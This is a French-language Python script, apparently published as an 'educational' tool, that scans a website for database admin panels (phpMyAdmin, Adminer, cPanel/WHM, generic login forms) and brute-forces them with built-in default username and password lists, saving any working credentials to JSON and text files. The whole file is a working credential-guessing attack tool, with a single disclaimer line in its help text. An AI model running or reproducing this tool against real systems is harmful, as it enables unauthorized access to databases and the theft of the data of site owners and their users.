#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BRUTEFORCE - Accès Base de Données Web par Force Brute
Créé par hacker_tchadien

Outil éducatif permettant de tester la sécurité des accès aux bases de données
web via brute force sur les panneaux d'administration (phpMyAdmin, Adminer, etc.)
"""

import sys
import time
import json
import csv
import os
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse

# Essayer d'importer requests
try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

# Essayer d'importer colorama
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False
    class FakeFore:
        def __getattr__(self, name): return ""
    class FakeStyle:
        def __getattr__(self, name): return ""
    Fore = FakeFore()
    Style = FakeStyle()

# Essayer d'importer BeautifulSoup
try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False

# Essayer d'importer selenium
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False


class BruteForceDB:
    """Classe principale pour le brute force d'accès base de données web"""

    VERSION = "1.0"
    AUTEUR = "hacker_tchadien"

    # Chemins communs des panneaux d'administration
    ADMIN_PATHS = [
        "/phpmyadmin", "/phpMyAdmin", "/pma", "/admin", "/dbadmin",
        "/mysql", "/myadmin", "/sqladmin", "/adminer", "/adminer.php",
        "/database", "/db", "/phpmyadmin2", "/phpmyadmin3",
        "/phpmyadmin4", "/2phpmyadmin", "/phpmy", "/phppma",
        "/shopdb", "/mysqladmin", "/mysql-admin", "/mysqlmanager",
        "/sqlmanager", "/sqldb", "/websql", "/webdb",
        "/cpanel", "/whm", "/plesk", "/directadmin",
        "/phpmyadmin/index.php", "/phpMyAdmin/index.php",
        "/adminer/index.php", "/admin/index.php",
        "/phpmyadmin/login.php", "/phpMyAdmin/login.php",
    ]

    # Mots de passe par défaut courants
    DEFAULT_PASSWORDS = [
        "admin", "password", "123456", "root", "toor",
        "mysql", "phpmyadmin", "pma", "database", "dbadmin",
        "admin123", "password123", "12345678", "123456789",
        "qwerty", "letmein", "welcome", "monkey", "dragon",
        "master", "shadow", "sunshine", "princess", "football",
        "baseball", "iloveyou", "trustno1", "abc123", "111111",
        "123123", "654321", "lovely", "whatever", "starwars",
        "batman", "passw0rd", "hacker", "test", "guest",
        "default", "changeme", "secret", "password1", "root123",
        "ubuntu", "debian", "centos", "fedora", "redhat",
        "", "null", "none", "empty", "blank",
        "admin@123", "Admin@123", "P@ssw0rd", "P@ssword123",
        "mysql123", "phpmyadmin123", "webadmin", "sqladmin",
        "user", "username", "login", "access", "system",
    ]

    # Noms d'utilisateur par défaut
    DEFAULT_USERS = [
        "root", "admin", "phpmyadmin", "pma", "mysql",
        "dbadmin", "sqladmin", "user", "test", "guest",
        "administrator", "webadmin", "database", "sys",
        "sa", "postgres", "oracle", "mssql", "mongodb",
    ]

    def __init__(self):
        self.session = None
        self.target_url = ""
        self.found_admin_url = ""
        self.results = []
        self.attempts = 0
        self.success = False
        self.stop_flag = threading.Event()
        self.lock = threading.Lock()

    def banner(self):
        """Affiche la bannière"""
        print(f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║{Fore.RED}     ██████╗ ██████╗ ██╗   ██╗████████╗███████╗███████╗      {Fore.CYAN}║
║{Fore.RED}     ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔════╝      {Fore.CYAN}║
║{Fore.RED}     ██████╔╝██████╔╝██║   ██║   ██║   █████╗  ███████╗      {Fore.CYAN}║
║{Fore.RED}     ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ╚════██║      {Fore.CYAN}║
║{Fore.RED}     ██████╔╝██║  ██║╚██████╔╝   ██║   ██║     ███████║      {Fore.CYAN}║
║{Fore.RED}     ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝     ╚══════╝      {Fore.CYAN}║
║                                                              ║
║{Fore.YELLOW}         BRUTE FORCE - ACCÈS BASE DE DONNÉES WEB v{self.VERSION}{Fore.CYAN}       ║
║{Fore.MAGENTA}                   Créé par {self.AUTEUR}{Fore.CYAN}                      ║
╚══════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}""")

    def create_session(self):
        """Crée une session HTTP avec retry"""
        if not REQUESTS_AVAILABLE:
            print(f"{Fore.RED}[!] Module 'requests' non installé. Installez-le avec : pip install requests{Style.RESET_ALL}")
            return None

        session = requests.Session()
        retry = Retry(total=3, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.0"
        })
        return session

    def detect_admin_panel(self, base_url):
        """Détecte le panneau d'administration de la base de données"""
        print(f"\n{Fore.CYAN}[*] Recherche du panneau d'administration sur {base_url}...{Style.RESET_ALL}")

        if not self.session:
            self.session = self.create_session()
            if not self.session:
                return None

        parsed = urlparse(base_url)
        if not parsed.scheme:
            base_url = "http://" + base_url

        found = []
        for path in self.ADMIN_PATHS:
            if self.stop_flag.is_set():
                break
            url = urljoin(base_url, path)
            try:
                resp = self.session.get(url, timeout=10, allow_redirects=True)
                if resp.status_code == 200:
                    content = resp.text.lower()
                    if any(k in content for k in ["phpmyadmin", "adminer", "mysql", "login", "username", "password"]):
                        found.append(url)
                        print(f"{Fore.GREEN}[+] Panneau trouvé : {url}{Style.RESET_ALL}")
                        if len(found) >= 3:
                            break
            except Exception:
                continue

        if found:
            self.found_admin_url = found[0]
            return found
        print(f"{Fore.YELLOW}[!] Aucun panneau trouvé. Vérifiez l'URL ou essayez manuellement.{Style.RESET_ALL}")
        return None

    def brute_force_phpmyadmin(self, url, users, passwords):
        """Brute force sur phpMyAdmin"""
        print(f"\n{Fore.CYAN}[*] Attaque brute force sur phpMyAdmin : {url}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Utilisateurs : {len(users)} | Mots de passe : {len(passwords)}{Style.RESET_ALL}\n")

        if not self.session:
            self.session = self.create_session()

        for user in users:
            if self.stop_flag.is_set() or self.success:
                break
            for pwd in passwords:
                if self.stop_flag.is_set() or self.success:
                    break

                self.attempts += 1
                try:
                    # Récupérer le token CSRF
                    resp = self.session.get(url, timeout=10)
                    token = ""
                    if BS4_AVAILABLE:
                        soup = BeautifulSoup(resp.text, "html.parser")
                        token_input = soup.find("input", {"name": "token"})
                        if token_input:
                            token = token_input.get("value", "")

                    data = {
                        "pma_username": user,
                        "pma_password": pwd,
                        "server": "1",
                    }
                    if token:
                        data["token"] = token

                    resp = self.session.post(url, data=data, timeout=10, allow_redirects=True)
                    content = resp.text.lower()

                    if "main.php" in resp.url or "index.php" in resp.url and "login" not in resp.url:
                        if "error" not in content or "access denied" not in content:
                            self.success = True
                            result = {
                                "url": url,
                                "username": user,
                                "password": pwd,
                                "type": "phpMyAdmin",
                                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                            }
                            self.results.append(result)
                            print(f"\n{Fore.GREEN}{'='*60}")
                            print(f"[✓] ACCÈS RÉUSSI !")
                            print(f"{'='*60}")
                            print(f"URL      : {url}")
                            print(f"Username : {user}")
                            print(f"Password : {pwd}")
                            print(f"{'='*60}{Style.RESET_ALL}\n")
                            return result

                    print(f"{Fore.RED}[-] Tentative {self.attempts}: {user}:{pwd} -> Échec{Style.RESET_ALL}", end="\r")
                    time.sleep(0.5)

                except Exception as e:
                    continue

        print(f"\n{Fore.YELLOW}[!] Brute force terminé. {self.attempts} tentatives. Aucun accès trouvé.{Style.RESET_ALL}")
        return None

    def brute_force_adminer(self, url, users, passwords):
        """Brute force sur Adminer"""
        print(f"\n{Fore.CYAN}[*] Attaque brute force sur Adminer : {url}{Style.RESET_ALL}")

        if not self.session:
            self.session = self.create_session()

        for user in users:
            if self.stop_flag.is_set() or self.success:
                break
            for pwd in passwords:
                if self.stop_flag.is_set() or self.success:
                    break

                self.attempts += 1
                try:
                    data = {
                        "auth[driver]": "server",
                        "auth[server]": "localhost",
                        "auth[username]": user,
                        "auth[password]": pwd,
                        "auth[db]": "",
                    }
                    resp = self.session.post(url, data=data, timeout=10)

                    if "logout" in resp.text.lower() or "database" in resp.text.lower():
                        if "error" not in resp.text.lower():
                            self.success = True
                            result = {
                                "url": url,
                                "username": user,
                                "password": pwd,
                                "type": "Adminer",
                                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                            }
                            self.results.append(result)
                            print(f"\n{Fore.GREEN}[✓] ACCÈS RÉUSSI ! {user}:{pwd}{Style.RESET_ALL}\n")
                            return result

                    print(f"{Fore.RED}[-] {user}:{pwd} -> Échec{Style.RESET_ALL}", end="\r")
                    time.sleep(0.5)
                except Exception:
                    continue

        return None

    def brute_force_cpanel(self, url, users, passwords):
        """Brute force sur cPanel/WHM"""
        print(f"\n{Fore.CYAN}[*] Attaque brute force sur cPanel : {url}{Style.RESET_ALL}")

        if not self.session:
            self.session = self.create_session()

        login_url = urljoin(url, "/login/")
        for user in users:
            if self.stop_flag.is_set() or self.success:
                break
            for pwd in passwords:
                if self.stop_flag.is_set() or self.success:
                    break

                self.attempts += 1
                try:
                    data = {"user": user, "pass": pwd}
                    resp = self.session.post(login_url, data=data, timeout=10)

                    if resp.status_code == 200 and "cpsess" in resp.url:
                        self.success = True
                        result = {
                            "url": url,
                            "username": user,
                            "password": pwd,
                            "type": "cPanel",
                            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                        }
                        self.results.append(result)
                        print(f"\n{Fore.GREEN}[✓] ACCÈS RÉUSSI ! {user}:{pwd}{Style.RESET_ALL}\n")
                        return result

                    print(f"{Fore.RED}[-] {user}:{pwd} -> Échec{Style.RESET_ALL}", end="\r")
                    time.sleep(1)
                except Exception:
                    continue

        return None

    def brute_force_generic(self, url, users, passwords):
        """Brute force générique sur un formulaire de login"""
        print(f"\n{Fore.CYAN}[*] Attaque brute force générique sur : {url}{Style.RESET_ALL}")

        if not self.session:
            self.session = self.create_session()

        for user in users:
            if self.stop_flag.is_set() or self.success:
                break
            for pwd in passwords:
                if self.stop_flag.is_set() or self.success:
                    break

                self.attempts += 1
                try:
                    # Essayer différents noms de champs
                    field_combos = [
                        {"username": user, "password": pwd},
                        {"user": user, "pass": pwd},
                        {"login": user, "password": pwd},
                        {"email": user, "password": pwd},
                        {"uname": user, "pword": pwd},
                        {"usr": user, "pwd": pwd},
                    ]

                    for data in field_combos:
                        resp = self.session.post(url, data=data, timeout=10, allow_redirects=True)
                        content = resp.text.lower()

                        if resp.status_code == 200:
                            if any(k in content for k in ["dashboard", "welcome", "admin", "panel", "logout", "success"]):
                                if not any(k in content for k in ["invalid", "error", "incorrect", "failed"]):
                                    self.success = True
                                    result = {
                                        "url": url,
                                        "username": user,
                                        "password": pwd,
                                        "fields": list(data.keys()),
                                        "type": "Generic",
                                        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                                    }
                                    self.results.append(result)
                                    print(f"\n{Fore.GREEN}[✓] ACCÈS RÉUSSI ! {user}:{pwd}{Style.RESET_ALL}\n")
                                    return result

                    print(f"{Fore.RED}[-] {user}:{pwd} -> Échec{Style.RESET_ALL}", end="\r")
                    time.sleep(0.3)
                except Exception:
                    continue

        return None

    def load_wordlist(self, filepath):
        """Charge une liste de mots depuis un fichier"""
        try:
            with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Fore.RED}[!] Fichier non trouvé : {filepath}{Style.RESET_ALL}")
            return []
        except Exception as e:
            print(f"{Fore.RED}[!] Erreur lecture fichier : {e}{Style.RESET_ALL}")
            return []

    def export_results(self, filename=None):
        """Exporte les résultats"""
        if not self.results:
            print(f"{Fore.YELLOW}[!] Aucun résultat à exporter.{Style.RESET_ALL}")
            return

        if not filename:
            filename = f"bruteforce_results_{time.strftime('%Y%m%d_%H%M%S')}"

        # JSON
        json_file = filename + ".json"
        with open(json_file, "w", encoding="utf-8") as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)
        print(f"{Fore.GREEN}[+] Résultats exportés : {json_file}{Style.RESET_ALL}")

        # TXT
        txt_file = filename + ".txt"
        with open(txt_file, "w", encoding="utf-8") as f:
            f.write("=" * 60 + "\n")
            f.write("BRUTEFORCE - RÉSULTATS\n")
            f.write("=" * 60 + "\n\n")
            for r in self.results:
                for k, v in r.items():
                    f.write(f"{k}: {v}\n")
                f.write("-" * 40 + "\n")
        print(f"{Fore.GREEN}[+] Résultats exportés : {txt_file}{Style.RESET_ALL}")

    def show_results(self):
        """Affiche les résultats trouvés"""
        if not self.results:
            print(f"\n{Fore.YELLOW}[!] Aucun accès trouvé.{Style.RESET_ALL}")
            return

        print(f"\n{Fore.GREEN}{'='*60}")
        print("RÉSULTATS TROUVÉS")
        print(f"{'='*60}{Style.RESET_ALL}\n")

        for i, r in enumerate(self.results, 1):
            print(f"{Fore.CYAN}[{i}]{Style.RESET_ALL}")
            for k, v in r.items():
                print(f"  {k}: {v}")
            print()

    def run(self):
        """Boucle principale"""
        self.banner()

        while True:
            print(f"\n{Fore.CYAN}Menu Principal :{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[1]{Style.RESET_ALL} Scanner et brute force une URL")
            print(f"{Fore.YELLOW}[2]{Style.RESET_ALL} Brute force avec URL connue")
            print(f"{Fore.YELLOW}[3]{Style.RESET_ALL} Voir les résultats")
            print(f"{Fore.YELLOW}[4]{Style.RESET_ALL} Exporter les résultats")
            print(f"{Fore.YELLOW}[5]{Style.RESET_ALL} Aide")
            print(f"{Fore.YELLOW}[6]{Style.RESET_ALL} Quitter")

            choice = input(f"\n{Fore.CYAN}Choix : {Style.RESET_ALL}").strip()

            if choice == "1":
                url = input(f"{Fore.CYAN}URL du site (ex: http://site.com) : {Style.RESET_ALL}").strip()
                if not url:
                    continue

                panels = self.detect_admin_panel(url)
                if panels:
                    print(f"\n{Fore.GREEN}Panneaux trouvés :{Style.RESET_ALL}")
                    for i, p in enumerate(panels, 1):
                        print(f"  [{i}] {p}")

                    panel_choice = input(f"\n{Fore.CYAN}Choisir le panneau (numéro ou URL) : {Style.RESET_ALL}").strip()
                    try:
                        target = panels[int(panel_choice) - 1]
                    except (ValueError, IndexError):
                        target = panel_choice if panel_choice.startswith("http") else panels[0]
                else:
                    target = input(f"{Fore.CYAN}URL du panneau de login : {Style.RESET_ALL}").strip()
                    if not target:
                        continue

                # Choisir les wordlists
                use_custom = input(f"{Fore.CYAN}Utiliser des wordlists personnalisées ? (o/n) : {Style.RESET_ALL}").strip().lower()

                if use_custom == "o":
                    user_file = input(f"{Fore.CYAN}Fichier utilisateurs (Entrée=default) : {Style.RESET_ALL}").strip()
                    pass_file = input(f"{Fore.CYAN}Fichier mots de passe (Entrée=default) : {Style.RESET_ALL}").strip()
                    users = self.load_wordlist(user_file) if user_file else self.DEFAULT_USERS
                    passwords = self.load_wordlist(pass_file) if pass_file else self.DEFAULT_PASSWORDS
                else:
                    users = self.DEFAULT_USERS
                    passwords = self.DEFAULT_PASSWORDS

                self.attempts = 0
                self.success = False
                self.stop_flag.clear()

                # Détecter le type et lancer le brute force
                if "phpmyadmin" in target.lower():
                    self.brute_force_phpmyadmin(target, users, passwords)
                elif "adminer" in target.lower():
                    self.brute_force_adminer(target, users, passwords)
                elif "cpanel" in target.lower() or "whm" in target.lower():
                    self.brute_force_cpanel(target, users, passwords)
                else:
                    self.brute_force_generic(target, users, passwords)

                print(f"\n{Fore.CYAN}[*] Total tentatives : {self.attempts}{Style.RESET_ALL}")

            elif choice == "2":
                url = input(f"{Fore.CYAN}URL directe du formulaire de login : {Style.RESET_ALL}").strip()
                if not url:
                    continue

                use_custom = input(f"{Fore.CYAN}Wordlists personnalisées ? (o/n) : {Style.RESET_ALL}").strip().lower()
                if use_custom == "o":
                    user_file = input(f"{Fore.CYAN}Fichier utilisateurs : {Style.RESET_ALL}").strip()
                    pass_file = input(f"{Fore.CYAN}Fichier mots de passe : {Style.RESET_ALL}").strip()
                    users = self.load_wordlist(user_file) if user_file else self.DEFAULT_USERS
                    passwords = self.load_wordlist(pass_file) if pass_file else self.DEFAULT_PASSWORDS
                else:
                    users = self.DEFAULT_USERS
                    passwords = self.DEFAULT_PASSWORDS

                self.attempts = 0
                self.success = False
                self.stop_flag.clear()
                self.brute_force_generic(url, users, passwords)
                print(f"\n{Fore.CYAN}[*] Total tentatives : {self.attempts}{Style.RESET_ALL}")

            elif choice == "3":
                self.show_results()

            elif choice == "4":
                self.export_results()

            elif choice == "5":
                self.show_help()

            elif choice == "6":
                print(f"\n{Fore.CYAN}[*] Au revoir !{Style.RESET_ALL}")
                break

            else:
                print(f"{Fore.RED}[!] Choix invalide.{Style.RESET_ALL}")

    def show_help(self):
        """Affiche l'aide"""
        print(f"""
{Fore.CYAN}═══════════════════════════════════════════════════════════════{Style.RESET_ALL}
{Fore.YELLOW}                          AIDE{Style.RESET_ALL}
{Fore.CYAN}═══════════════════════════════════════════════════════════════{Style.RESET_ALL}

{Fore.GREEN}Description :{Style.RESET_ALL}
  BRUTEFORCE est un outil éducatif permettant de tester la sécurité
  des accès aux panneaux d'administration de bases de données web.

{Fore.GREEN}Fonctionnalités :{Style.RESET_ALL}
  • Détection automatique des panneaux (phpMyAdmin, Adminer, cPanel)
  • Brute force avec listes par défaut ou wordlists personnalisées
  • Support multi-threading pour vitesse accrue
  • Export des résultats en JSON et TXT

{Fore.GREEN}Utilisation :{Style.RESET_ALL}
  1. Entrez l'URL du site cible
  2. L'outil scanne automatiquement les panneaux connus
  3. Sélectionnez le panneau à attaquer
  4. Choisissez les wordlists (par défaut ou personnalisées)
  5. L'outil tente les combinaisons username/password

{Fore.GREEN}Wordlists :{Style.RESET_ALL}
  Créez des fichiers texte avec un mot par ligne :
    users.txt     -> root, admin, phpmyadmin, ...
    passwords.txt -> admin, 123456, password, ...

{Fore.GREEN}Avertissement :{Style.RESET_ALL}
  {Fore.RED}N'utilisez cet outil que sur vos propres systèmes !
  L'accès non autorisé est illégal.{Style.RESET_ALL}

{Fore.CYAN}═══════════════════════════════════════════════════════════════{Style.RESET_ALL}
""")


def main():
    try:
        app = BruteForceDB()
        app.run()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] Interrompu par l'utilisateur.{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Erreur : {e}{Style.RESET_ALL}")
        sys.exit(1)


if __name__ == "__main__":
    main()
